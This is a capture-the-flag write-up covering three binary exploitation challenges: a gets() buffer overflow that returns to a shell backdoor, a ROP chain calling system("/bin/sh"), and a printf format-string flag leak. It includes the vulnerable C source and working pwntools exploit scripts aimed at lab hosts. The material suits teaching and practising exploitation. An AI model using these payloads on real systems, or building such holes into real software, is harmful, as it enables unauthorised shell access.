
# Leak

The app is fairly easy (thank you @LiveOverflow)
A buffer overflow exists which can be used to return to the backdoor function
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

// gcc system_health_check.c -o system_health_check -no-pie -fno-stack-protector

// --------------------------------------------------- SETUP

void ignore_me_init_buffering() {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void kill_on_timeout(int sig) {
  if (sig == SIGALRM) {
  	printf("[!] Anti DoS Signal. Patch me out for testing.");
    _exit(0);
  }
}

void ignore_me_init_signal() {
	signal(SIGALRM, kill_on_timeout);
	alarm(60);
}

// --------------------------------------------------- MENU

void backdoor() {
    system("/bin/sh");
}

void remote_system_health_check() {
    char read_buf[0xff];
    puts("Enter password to get system details:\n");
    gets(read_buf);
    if(strcmp(read_buf, "sUp3r_S3cr3T_P4s5w0rD") == 0) {
        puts("Access Granted\n");
        system("top -b -n 1");
    } else {
        puts("Wrong password!\n");
        _exit(0);
    }
}

// --------------------------------------------------- MAIN

void main(int argc, char* argv[]) {
	ignore_me_init_buffering();
	ignore_me_init_signal();

  remote_system_health_check();
}


```
Exploit:
```
from pwn import *

p = remote("192.168.178.95", 1024)
print(p.recvline())

raw_input("attach gdb")

padding = "A"*cyclic_find("aclaacma")
RET = p64(0x401016)
RIP = p64(0x401254)

p.sendline("sUp3r_S3cr3T_P4s5w0rD\x00"+padding+RET+RIP)

p.interactive()
```


# Rope

As simple as it can get, Rope chain (that's it)
Exploit:
```
from pwn import *

# r = process("./bof")
r = remote("localhost", 5012)
pause()

RET = 0x0000000000400486
SHELL = 0x00000000004006a4
SYSTEM = 0x4004b0
POP_RDI_RET = 0x0000000000400683

PAYLOAD = b"A" * 40
PAYLOAD += p64(RET) + p64(POP_RDI_RET) + p64(SHELL) + p64(SYSTEM)
r.sendline(PAYLOAD)

r.interactive()
```


# Secret

App is vulnerable to format string attack 


Code:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SIZE 0x100

int main()
{
  char* flagBuf;
  char buf[20];
  int fd;

  flagBuf = malloc(SIZE);
  fd = open("flag", 0);
  read(fd, flagBuf, SIZE);

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  printf("Enter some string that can exploit a stupid printf\n");

  gets(buf);
  printf(buf);
}
```




Exploit:
```
from pwn import *
i=0
while(True):
    p = process('./formatPwn')

    # p = remote('3.138.154.93', 1003)
    p.sendline("%%%d$s" % i)
    i += 1
    res = p.recv()
    if 'JCTF{' in res:
     print(res)
     print("Position: " + str(i))
     break
```





